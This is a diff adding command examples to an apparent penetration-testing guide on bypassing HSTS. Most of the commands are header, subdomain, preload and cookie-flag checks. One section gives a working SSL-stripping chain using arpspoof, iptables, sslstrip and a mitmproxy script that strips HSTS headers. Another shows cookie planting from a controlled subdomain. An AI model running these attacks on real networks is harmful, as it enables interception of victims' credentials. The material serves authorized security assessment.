@@ -42,6 +42,17 @@ HSTS bypass is most impactful when:
 
 Check for the `Strict-Transport-Security` header on every HTTPS response:
 
+```bash
+curl -sI https://TARGET.com | grep -i strict-transport-security
+curl -sI https://TARGET.com | tr -d '\r' | sort | head -30
+```
+
+Example of a fully-specified policy:
+
+```http
+HTTP/1.1 200 OK
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
 
 **Required fields to check:**
 
@@ -53,6 +64,16 @@ Check for the `Strict-Transport-Security` header on every HTTPS response:
 
 ### Detection Method
 
+```bash
+# Full policy parse across apex + subdomains
+for host in TARGET.com api.TARGET.com admin.TARGET.com staging.TARGET.com; do
+  echo "== $host =="
+  curl -sI "https://$host" | grep -i strict-transport-security || echo "(no HSTS header)"
+done
+
+# Check TLS config while at it
+openssl s_client -connect TARGET.com:443 -servername TARGET.com </dev/null 2>/dev/null | openssl x509 -noout -subject -dates
+```
 
 If the header is absent on the initial HTTPS response, HSTS is not enforced and there is nothing to bypass. Report it as a missing HSTS configuration issue instead.
 
@@ -67,6 +88,13 @@ If the header is present, proceed with the bypass techniques below.
 HSTS only takes effect **after** the browser receives and caches the header. On the very first visit, the browser has no cached policy and will happily connect over HTTP if the server responds on port 80.
 
 ### Attack Window
+
+```bash
+# Fresh profile: request HTTP before any HTTPS contact
+curl -sI http://TARGET.com
+curl -s -L -o /dev/null -w '%{url_effective} %{http_code}\n' http://TARGET.com
+# If the first response is 200 over HTTP (not a 301 to HTTPS), the downgrade window exists.
+```
 
 
 ### Testing
@@ -99,11 +127,31 @@ If the `Strict-Transport-Security` header lacks the `includeSubDomains` directiv
 
 ### Testing
 
+```bash
+# Enumerate subdomains, then test each over plain HTTP
+subfinder -d TARGET.com -silent | httpx -http-proxy "" --follow-redirects=false \
+  -title -status-code -silent
+
+# Direct check: does any subdomain serve 200 over HTTP?
+for sub in $(cat subs.txt); do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "http://$sub" --max-time 5)
+  [ "$code" = "200" ] && echo "[HTTP-OK] $sub"
+done
+```
 
 If any subdomain serves content over HTTP without redirecting to HTTPS, it is a bypass vector.
 
 ### Subdomain Takeover Check
 
+```bash
+# CNAMEs pointing to unclaimed services
+dig +short CNAME old-api.TARGET.com
+dig +short CNAME blog.TARGET.com
+# Fingerprints: NXDOMAIN/Azure "404 Not Found"/GitHub Pages 404 on the CNAME target
+curl -s http://old-api.TARGET.com | grep -iE 'there isn.t a github pages site|404 web server|not found.*azurewebsites'
+# Verify claimability with a takeover tool (read-only detection mode)
+subjack -w subs.txt -t 20 -ssl -v
+```
 
 ---
 
@@ -135,6 +183,16 @@ The HSTS preload list is a hardcoded list of domains in browsers (Chrome, Firefo
 2. Verify all preload requirements are met in the actual HTTP response
 3. Check subdomains — the apex being preloaded does not cover subdomains unless they are also in the preload list
 
+```bash
+# Programmatic check of the live header against the 5 requirements
+curl -sI https://TARGET.com | grep -i strict-transport-security
+# max-age >= 31536000? includeSubDomains? preload? HTTP->HTTPS 301?
+curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' http://TARGET.com
+
+# Query the Chrome preload list source snapshot (Chromium repo)
+curl -s https://raw.githubusercontent.com/chromium/chromium/main/net/http/transport_security_state_static.json \
+  | python3 -c "import json,sys; d=json.load(sys.stdin); print([e['name'] for e in d['entries'] if 'TARGET' in e.get('name','')])"
+```
 
 ---
 
@@ -150,12 +208,38 @@ SSL stripping is an active attack where a MITM attacker intercepts the initial H
 
 ### Attack Flow
 
+```text
+Victim on open Wi-Fi
+  └─> Attacker ARPs/answers DNS for target.com
+        └─> Victim requests http://target.com (first visit, no cached HSTS)
+              └─> Attacker proxies to https://target.com (real server)
+                    └─> Strips Location: https://... redirects and the HSTS header,
+                        rewrites href/action attributes from https:// to http://
+                          └─> Victim submits credentials over plaintext -> captured
+```
 
 ### Tools for SSL Stripping
 
 - `sslstrip` — Classic tool for HTTP downgrade
 - `mitmproxy` with sslstrip addon
 - Custom proxy that removes HSTS headers from responses
+
+```bash
+# Classic sslstrip chain (authorized lab only)
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
+sudo arpspoof -i eth0 -t <victim-ip> <gateway-ip>
+sslstrip -l 10000 -w captured.log
+
+# mitmproxy equivalent (strips HSTS via its rewrite of responses)
+mitmproxy --mode transparent --set sslstrip=true -s strip_hsts.py
+
+# strip_hsts.py — remove the policy so the browser never caches it
+from mitmproxy import http
+def response(flow: http.HTTPFlow) -> None:
+    flow.response.headers.pop("Strict-Transport-Security", None)
+    flow.response.headers["location"] = flow.response.headers.get("location", "").replace("https://", "http://")
+```
 
 ### Detection Indicators
 
@@ -192,6 +276,18 @@ HSTS policies are cached by the browser for the duration of `max-age`. An attack
 
 Use a fresh browser profile or clear the HSTS cache before testing:
 
+```bash
+# Chrome: clear cached HSTS entries via DevTools protocol (headless)
+chrome --headless --disable-gpu \
+  --remote-debugging-port=9222 about:blank
+curl -s http://127.0.0.1:9222/json/new?chrome://net-internals/\#hsts
+
+# Firefox: fresh profile with no HSTS state
+firefox -CreateProfile hststest
+firefox -P hststest -no-remote http://TARGET.com
+```
+
+Manual check: in Chrome visit `chrome://net-internals/#hsts` → "Query HSTS/PKP domain" for `target.com`, then "Delete domain security policies" to reset the first-visit window.
 
 ---
 
@@ -211,8 +307,28 @@ If session cookies lack the `Secure` flag, they will be transmitted over HTTP co
 
 ### Testing
 
+```bash
+# Extract Set-Cookie flags from the login flow
+curl -sI https://TARGET.com/login | grep -i set-cookie
+curl -s -X POST https://TARGET.com/login -d 'user=u&pass=p' -i | grep -i set-cookie
+
+# Vulnerable: no Secure flag -> cookie will ride an HTTP downgrade
+# SessionID=abc123; Path=/; HttpOnly        <-- missing Secure
+```
 
 If any session cookie lacks `Secure`, it is vulnerable to downgrade-based theft.
+
+Subdomain scope trick (related vector): a cookie set by ANY subdomain with
+`Domain=.TARGET.com` is sent to every sibling subdomain — if you control one
+HTTP-only subdomain, you can plant/overwrite session cookies for the HTTPS app:
+
+```http
+GET / HTTP/1.1
+Host: attacker-controlled.TARGET.com
+
+HTTP/1.1 200 OK
+Set-Cookie: SESSIONID=attacker-value; Domain=.TARGET.com; Path=/
+```
 
 ### Cookie Flags to Check
 
@@ -228,21 +344,43 @@ If any session cookie lacks `Secure`, it is vulnerable to downgrade-based theft.
 
 ### Step 1: Header Analysis
 
+```bash
+curl -sI https://TARGET.com | tr -d '\r' | grep -iE 'strict-transport|server|x-powered'
+```
 
 ### Step 2: HTTP Response Check
 
+```bash
+curl -sI http://TARGET.com
+# Expect: 301 -> https://TARGET.com on every path; anything else is a downgrade window.
+```
 
 ### Step 3: Subdomain Enumeration
 
+```bash
+subfinder -d TARGET.com -silent > subs.txt
+httpx -l subs.txt -status-code -title -follow-redirects=false -silent
+```
 
 ### Step 4: Preload Verification
 
+```bash
+curl -s "https://hstspreload.org/api/v2/status?domain=TARGET.com"
+# {"status":"preloaded"} vs {"status":"unknown"} — plus verify header directives manually.
+```
 
 ### Step 5: Cookie Analysis
 
+```bash
+curl -s -v https://TARGET.com/login -o /dev/null 2>&1 | grep -i set-cookie
+# Flag each cookie missing Secure / HttpOnly / SameSite.
+```
 
 ### Step 6: Document Findings
 
+Record the raw request/response pair, the exact directive that is weak or missing,
+and the concrete bypass it enables (first-visit MITM, subdomain HTTP, cookie theft)
+via `recordEvidence`.
 
 ### Tools for Manual Testing
 
